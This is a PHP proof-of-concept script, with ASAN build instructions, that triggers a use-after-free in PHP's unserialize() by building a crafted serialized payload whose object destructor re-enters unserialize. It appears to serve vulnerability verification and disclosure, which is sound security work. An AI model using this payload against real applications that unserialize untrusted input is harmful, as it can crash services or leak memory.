<?php
/**
 * CVE-2026-109618/109619 — var_destroy __destruct reentry UAF verification.
 *
 * Triggers a heap-use-after-free in php_var_unserialize: var_destroy() frees
 * back-reference extension chunks while building the dtor list, then
 * i_zval_ptr_dtor fires __destruct WITHOUT BG(serialize_lock). The inner
 * unserialize('R:1500;') reuses the outer var_hash (freed entries) → UAF read.
 *
 * ⚠️  This PoC requires an ASAN build of PHP. This repository does NOT ship
 * one (there is no php-asan-lab image) — build it yourself, e.g.:
 *
 *   docker run --rm -it php:8.2.34 \
 *     bash -c "apt-get update && apt-get install -y clang libasan6 && \
 *       export CC=clang CFLAGS='-fsanitize=address -g' LDFLAGS='-fsanitize=address' && \
 *       ./configure --enable-debug && make -j\$(nproc)"
 *
 * Run with:  USE_ZEND_ALLOC=0 ASAN_OPTIONS="detect_leaks=0" php verify_uaf_asan.php
 *
 * Without ASAN the UAF is silent (may crash or return garbage) — a clean run
 * with no ASAN report is NOT evidence of absence.
 *
 * Line numbers below refer to the PHP-8.2 branch and drift between versions.
 *
 * For authorized security testing only.
 */

class TriggerUAF {
    public function __destruct() {
        fwrite(STDERR, "[*] __destruct fired (serialize_lock=0, BG(unserialize).level>0)\n");
        fwrite(STDERR, "[*] Attempting R:1500 backref into freed var_hash extension chunk...\n");
        $result = @unserialize('R:1500;');
        $type = gettype($result);
        fwrite(STDERR, "[*] R:1500 resolved to: $type\n");
        if ($result !== false) {
            fwrite(STDERR, "[+] UAF CONFIRMED: R:1500 read from freed memory!\n");
        }
    }
}

// Build payload: 2000+ entries to overflow VAR_ENTRIES_MAX (1018)
// Then duplicate key to move TriggerUAF to dtor list
$N = 2000;
$payload = 'a:' . ($N + 2) . ':{';
for ($i = 0; $i < $N; $i++) {
    $payload .= "i:$i;i:$i;";
}
$payload .= 'i:99999;O:10:"TriggerUAF":0:{}';
$payload .= 'i:99999;i:42;';
$payload .= '}';

fwrite(STDERR, "[*] Payload: " . strlen($payload) . " bytes, $N entries + UAF trigger\n");
fwrite(STDERR, "[*] Firing unserialize()...\n");

@unserialize($payload);

fwrite(STDERR, "[*] Done. If ASAN reported heap-use-after-free, the UAF is confirmed.\n");
fwrite(STDERR, "[*] Expected ASAN trace (line numbers drift between versions):\n");
fwrite(STDERR, "    READ at php_var_unserialize (back-reference resolution)\n");
fwrite(STDERR, "    freed at var_destroy (var_hash extension chunk teardown)\n");
